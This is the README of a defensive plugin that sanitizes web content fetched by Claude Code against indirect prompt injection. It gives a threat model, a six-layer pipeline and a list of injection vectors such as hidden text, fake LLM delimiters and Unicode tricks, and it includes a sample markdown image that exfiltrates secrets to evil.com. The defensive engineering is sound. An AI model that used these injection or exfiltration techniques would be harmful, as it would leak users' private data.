# safe-fetch

Sanitizing web fetch plugin for Claude Code. Strips prompt injection vectors before content reaches the LLM, providing defense-in-depth against indirect prompt injection attacks.

## Why

Companies block Claude Code's built-in `WebFetch` and `WebSearch` tools to prevent indirect prompt injection — where malicious websites embed hidden instructions that hijack the LLM. But the blanket ban cripples productivity since `curl` output is raw and unusable. This plugin provides a security-team-approvable alternative.

## Threat Model

The attack chain requires three things (Simon Willison's "Lethal Trifecta"):
1. Access to private data (your code, API keys, conversation context)
2. Exposure to untrusted tokens (fetched web content)
3. An exfiltration vector (tool calls, rendered markdown images)

This plugin breaks link #2 by aggressively sanitizing untrusted tokens before they reach the LLM.

## Features

### MCP Tools
| Tool | Purpose |
|------|---------|
| `fetch` | URL → sanitized markdown. Supports `prompt` (focused extraction) and `max_tokens` (truncation). Handles HTML, PDF, JSON, plain text. |
| `search` | Web search via Brave API → sanitized results. Supports `country`/`city` for geo-localization. |
| `check_url` | Validate URL safety without fetching. |

### Plugin Components
| Component | What it does |
|-----------|-------------|
| `/fetch <url> [focus]` | Slash command for sanitized fetching |
| `/search <query>` | Slash command for sanitized search |
| `/check-url <url>` | Slash command for URL validation |
| `web-researcher` agent | Autonomous multi-step research (search → evaluate → fetch → synthesize) |
| PreToolUse hooks | Blocks built-in `WebFetch`/`WebSearch`, redirects to safe-fetch |
| PostToolUse hook | Warns when `curl`/`wget` bypasses sanitization |

### 6-Layer Sanitization Pipeline

```
Layer 1: URL Policy         Domain allowlist, SSRF prevention (private IPs, cloud metadata)
Layer 2: Rate Limiting      Token-bucket per-domain (10/min) + global (60/min)
Layer 3: HTTP Fetch         httpx with timeouts, redirect limits, 5MB body cap
Layer 4: HTML Sanitization  Strips script/style/iframe/svg, hidden elements, comments, data attrs
Layer 5: Text Sanitization  NFKC normalization, zero-width/bidi/tag Unicode, LLM delimiters,
                            base64 payload detection, exfiltration URL defanging
Layer 6: Context Framing    Wraps output with untrusted-data markers
```

### Attack Vectors Neutralized
- CSS-hidden text (`display:none`, `opacity:0`, `font-size:0`, off-screen positioning)
- HTML comments containing instructions
- Fake LLM delimiters (`<|im_start|>`, `[INST]`, `<<SYS>>`, etc.)
- Zero-width Unicode characters (U+200B, U+200C, U+200D, U+FEFF)
- Unicode tag characters (U+E0000–U+E007F)
- Bidirectional text overrides (U+202A–U+202E, U+2066–U+2069)
- Base64-encoded instruction payloads
- Markdown image exfiltration (`![](https://evil.com?data=SECRETS)`)
- SSRF via private IPs, localhost, cloud metadata endpoints

## Installation

### Prerequisites
- Python 3.10+
- [uv](https://docs.astral.sh/uv/)

### Setup

```bash
# From the plugin directory
cd plugins/safe-fetch
uv venv && uv pip install -e ".[dev]"
```

### Add to Claude Code

The plugin auto-registers the MCP server via `.mcp.json`. If installing standalone:

```bash
claude mcp add safe-fetch -- uv run --directory /path/to/safe-fetch python -m safe_fetch
```

With domain restrictions:
```bash
claude mcp add \
  --env ALLOWED_DOMAINS="github.com,stackoverflow.com,docs.python.org" \
  safe-fetch -- uv run --directory /path/to/safe-fetch python -m safe_fetch
```

## Configuration

All configuration via environment variables in `.mcp.json`:

| Variable | Default | Description |
|----------|---------|-------------|
| `ALLOWED_DOMAINS` | *(empty = allow all public)* | Comma-separated domain allowlist |
| `BLOCKED_DOMAINS` | *(empty)* | Additional blocked domains |
| `RATE_LIMIT_PER_DOMAIN` | `10` | Requests per minute per domain |
| `RATE_LIMIT_GLOBAL` | `60` | Global requests per minute |
| `BRAVE_API_KEY` | *(required for search)* | [Brave Search API key](https://brave.com/search/api/) |
| `SAFE_FETCH_TIMEOUT` | `30` | HTTP timeout in seconds |
| `SAFE_FETCH_MAX_BODY` | `5242880` | Max response body in bytes (5MB) |

## Tests

```bash
cd plugins/safe-fetch
uv run pytest tests/ -v
```

83 tests covering:
- All injection vectors (14 attack types in `fixtures/injection_payloads.html`)
- SSRF prevention (localhost, private IPs, cloud metadata)
- Domain allowlist/blocklist
- Rate limiting (per-domain and global)
- Content extraction (HTML, JSON, PDF, plain text)
- Token truncation

## Performance

Benchmarked on Apple Silicon (M-series):

| Operation | Time |
|-----------|------|
| HTML sanitization (30KB input) | 1.0ms |
| Text sanitization (14KB input) | 0.7ms |
| Full pipeline (sanitize + extract + frame) | 61ms |

The bottleneck is Trafilatura's content extraction (~59ms). The sanitizer itself adds <2ms. Network I/O (200-900ms) dominates real-world latency.

## License

MIT
